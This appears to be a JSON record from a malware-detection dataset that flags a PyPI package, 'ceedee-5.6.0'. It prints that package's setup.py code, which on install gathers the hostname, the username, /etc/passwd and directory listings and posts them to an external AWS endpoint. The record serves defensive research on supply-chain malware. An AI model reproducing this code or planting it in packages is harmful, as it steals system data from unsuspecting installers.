[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport platform\nfrom urllib import request, parse\n\nos_name = platform.system()\ndata = {}\nif os_name == 'Linux' or os_name == 'Darwin':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        passwd_file = os.popen('cat /etc/passwd').read()\n        os_info = os.popen('uname -a').read()\n        curr_dir = os.popen(\"pwd\").read()\n        list_curr_dir = os.popen(\"ls -la\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Password File': passwd_file,\n            'OS Information': os_info,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelif os_name == 'Windows':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        curr_dir = os.popen(\"cd\").read()\n        list_curr_dir = os.popen(\"dir\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelse:\n    data = {'Error': 'Cannot determine OS'}\n\ndata_enc = parse.urlencode(data).encode()\nAPI_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\nreq = request.Request(API_ENDPOINT, data=data_enc)\nres = request.urlopen(req)\n"
  },
  {
    "metadata": {
      "package_name": "ceedee-5.6.0",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/ceedee-5.6.0.txt"
    }
  }
]